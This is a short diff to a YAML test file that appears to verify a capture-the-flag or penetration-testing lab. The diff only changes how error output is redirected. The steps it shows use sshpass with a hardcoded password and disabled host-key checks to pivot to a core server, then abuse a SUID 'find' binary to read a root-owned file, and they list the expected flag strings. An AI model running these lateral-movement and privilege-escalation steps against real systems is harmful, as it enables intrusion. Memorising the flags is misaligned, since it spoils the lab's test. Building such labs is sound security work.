@@ -108,12 +108,12 @@ test:
       timeout: 15
 
     - name: "Pivot to core server and read marker 2"
-      command: "sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'cat /home/deploy/marker2.txt' 2>/dev/null"
+      command: "sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'cat /home/deploy/marker2.txt' 2>&1"
       expect: "3sc4l4t3"
       timeout: 15
 
     - name: "Escalate privileges via SUID find and read marker 3"
-      command: "sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'find . -exec cat /root/marker3.txt \\; -quit' 2>/dev/null"
+      command: "sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'find . -exec cat /root/marker3.txt \\; -quit' 2>&1"
       expect: "0wn3d"
       timeout: 15
 
